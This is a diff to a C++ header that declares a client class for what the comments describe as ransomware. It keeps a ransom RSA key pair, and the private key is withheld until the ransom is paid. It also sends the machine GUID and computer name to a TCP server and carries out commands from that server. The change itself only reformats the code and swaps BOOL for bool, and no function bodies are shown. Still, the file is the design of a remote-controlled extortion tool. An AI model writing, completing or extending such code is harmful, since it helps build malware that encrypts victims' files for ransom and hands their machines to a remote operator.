@@ -33,22 +33,22 @@ public:
     void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }
 
 private:
-    std::string        m_ComputerName = "";       // remote host computer name. e.g DESKTOP-AJDU31S
-    std::string        m_MachineGUID = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
+    std::string        m_ComputerName   = "";       // remote host computer name. e.g DESKTOP-AJDU31S
+    std::string        m_MachineGUID    = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
     RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
-    RSAKeys            m_RansomSecrets = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
-    SOCKET             m_TCPSocket = INVALID_SOCKET;
+    RSAKeys            m_RansomSecrets  = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
+    SOCKET             m_TCPSocket      = INVALID_SOCKET;
 
 #ifdef CLIENT_RELEASE                               // Client only methods
 public:
     Client();
     ~Client();
 
-    BOOL               Connect();                   // Connect to the tcp server
-    BOOL               Disconnect();                // Disconnect from the tcp server
+    bool               Connect();                   // Connect to the tcp server
+    bool               Disconnect();                // Disconnect from the tcp server
     BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
     bool               SendMessageToServer(Server& dest, ClientMessage message);
-    BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
+    bool               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     void               ListenForServerCommands();   // listen for commands from the server and perform them
     BOOL               PerformCommand(const Packet& command, ClientResponse& outResponse); // Perform a command from the tcp server
     const CMDDESC      CreateCommandDescription(const Packet& command);
@@ -56,10 +56,10 @@ public:
 private:
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
     void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
-    BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
-    BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
-    BOOL               IsServerAwaitingResponse(const Packet& commandPerformed);
-    BOOL               ExchangePublicKeys();        // send client public key, receive server public key
+    bool               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
+    bool               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
+    bool               IsServerAwaitingResponse(const Packet& commandPerformed);
+    bool               ExchangePublicKeys();        // send client public key, receive server public key
     Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
